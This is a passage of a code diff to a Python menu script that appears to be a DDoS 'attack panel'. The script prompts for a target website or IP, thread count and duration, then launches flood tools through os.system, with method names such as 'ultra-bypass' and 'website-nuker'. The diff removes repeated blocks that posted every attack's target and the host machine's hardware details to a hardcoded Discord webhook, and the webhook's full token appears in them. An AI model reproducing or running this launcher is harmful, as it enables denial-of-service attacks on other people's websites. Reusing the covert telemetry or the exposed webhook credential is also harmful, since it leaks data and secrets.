-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -1152,89 +584,9 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py get ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-get')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embedx.add_embed_field(name='Method:', value='mh-get')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -1252,89 +604,9 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py post ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-post')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embedx.add_embed_field(name='Method:', value='mh-post')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -1352,89 +624,9 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py dyn ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embed.add_embed_field(name='Method:', value='mh-dyn')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                     
-                    embedx.add_embed_field(name='Method:', value='mh-dyn')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -1452,89 +644,9 @@ def menu():
                     mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                     mhgetsend = ('python3 start.py null ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
-                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                    embed.add_embed_field(name='Method:', value='mh-null')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
+                   
                     os.system(mhgetsend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
-                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
-                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
-                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
-                    
-                    embedx.add_embed_field(name='Method:', value='mh-null')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
+                   
                     load()
                     license()
                     menu()
@@ -1550,83 +662,9 @@ def menu():
                     havenip = input("\033[31m\033[1m⮞ \033[0m\033[96mIP\033[31m:\033[36m\033[31m")
                     havensend = ('sudo ./haven -d ' + havenip)
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{havenip}')
                     
-                    embed.add_embed_field(name='Method:', value='haven-god')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(havensend)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{havenip}')
                     
-                    embedx.add_embed_field(name='Method:', value='haven-god')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
                     load()
                     license()
                     menu()
@@ -1647,90 +685,9 @@ def menu():
                     ultrabypassREQ = input("\033[31m\033[1m⮞\033[0m \033[96mThreads-Requests (minimum 5) and write it only in numbers without spaces \033[31m:\033[36m\033[31m")
                     sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request " + ultrabypassREQ)
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{ultrabypasswebsite}')
                     
-                    embed.add_embed_field(name='Time:', value=f'{ultrabypasstime}')
-                    
-                    embed.add_embed_field(name='Threads:', value=f'{ultrabypassREQ}')
-                    embed.add_embed_field(name='Method:', value='ultra-bypass')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(sendultrabypassattack)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{ultrabypasswebsite}')
-                    embedx.add_embed_field(name='Time:', value=f'{ultrabypasstime}')
                     
-                    embedx.add_embed_field(name='Threads:', value=f'{ultrabypassREQ}')
-                    embedx.add_embed_field(name='Method:', value='ultra-bypass')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='Method:', value='ultra-bypass')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
-                    responsex = webhookx.execute()
 
                     load()
                     license()
@@ -1747,85 +704,9 @@ def menu():
                     timewebsitenuker = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
                     sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
                     tip()
-                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')
-
-
-                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embed.set_timestamp()
-
-
-                    embed.add_embed_field(name='Attack Send to:', value=f'{websitenukerwebsite}')
                     
-                    embed.add_embed_field(name='Time:', value=f'{timewebsitenuker}')
-                    embed.add_embed_field(name='Method:', value='nuker-proxyless')
-                    embed.add_embed_field(name='Machine:', value=f'{machine}')
-                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhook.add_embed(embed)
-                    response = webhook.execute()
                     os.system(sendattackwebsitenuker)
-                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')
-
-
-                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')
-
-
-                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')
-
-                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')
-
-
-                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')
-
-
-                    embedx.set_timestamp()
-
-
-                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{websitenukerwebsite}')
                     
-                    embedx.add_embed_field(name='Time:', value=f'{timewebsitenuker}')
-                    embedx.add_embed_field(name='Method:', value='nuker-proxyless')
-                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
-                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
-                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
-                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
-                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
-                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
-                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
-                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
-                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
-                  
-
-
-
-                    webhookx.add_embed(embedx)
